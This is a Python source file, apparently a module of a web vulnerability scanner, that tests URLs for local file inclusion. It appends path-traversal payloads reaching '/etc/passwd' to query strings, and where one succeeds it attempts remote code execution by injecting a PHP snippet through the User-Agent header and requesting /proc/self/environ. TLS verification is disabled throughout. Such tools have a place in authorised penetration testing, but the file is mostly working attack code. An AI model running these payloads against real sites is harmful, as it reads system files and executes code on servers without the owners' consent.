import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from engine import *
from sess import *
from log import *

payloads = ['etc/passwd','../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
            '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd']


class lfi:

    def __init__(self):
        self.proxy_type = 0
        self.headers = ''


    def setInfo(self,headers,proxy_type):
        self.proxy_type = proxy_type
        self.headers = headers




    def lfi_get(self,url: str):

        sess = self.sess()

        if '=' not in url:
            return

        Log.warning("Found link GET Method: " + url)

        if not url.startswith("mailto:") and not url.startswith("tel:"):

            for payload in payloads:
                req = sess.get(url + payload, verify=False)
                if  'root:x' in req.text:
                    Log.high("Detected LFI at " + req.url)
                    file = open("lfi.txt", "a+")
                    file.write(str(req.url) + "\n")
                    file.close()

                    ########### RCE IN LFI ###########

                    rce = req.url.replace('/etc/passwd','/proc/self/environ')
                    sess.headers.update({'user-agent':'<? echo md5(UT); ?>'})
                    rce_req = sess.get(rce,verify=False)

                    if '87db16cba59e908888837d351af65bfe' in rce_req.text:
                        Log.high("Detected RCE in LFI at " + rce_req.url)
                        file = open("rce_in_lfi.txt", "a+")
                        file.write(str(req.url) + "\n")
                        file.close()

                    break


        else:
            pass


    def sess(self):

        if self.proxy_type == 4:
            session = sess(self.headers)

        else:
            session = sessProxy(self.headers,self.proxy_type)

        return session